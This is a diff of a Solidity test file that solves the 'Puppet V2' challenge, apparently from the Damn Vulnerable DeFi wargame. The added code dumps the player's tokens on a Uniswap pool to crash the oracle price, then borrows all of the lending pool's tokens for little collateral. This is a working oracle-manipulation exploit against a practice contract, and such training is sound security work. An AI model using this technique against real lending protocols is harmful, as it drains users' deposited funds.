@@ -17,8 +17,10 @@ contract PuppetV2Challenge is Test {
 
     uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
     uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
+
     uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
+    // DVTokens in pool
     uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
 
     WETH weth;
@@ -98,6 +100,25 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+
+        // Idea: calculate the swap paths needed for the token swap 
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        // Approve the router to spend my tokens
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        // swap my tokens for ETH
+        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(player), block.timestamp );
+
+        // calculate the ETH required to borrow all the tokens in the pool 
+        uint ethRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        // wrap the ETH to WETH
+        weth.deposit{value:ethRequired}();
+        weth.approve(address(lendingPool),ethRequired);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
         
     }
 
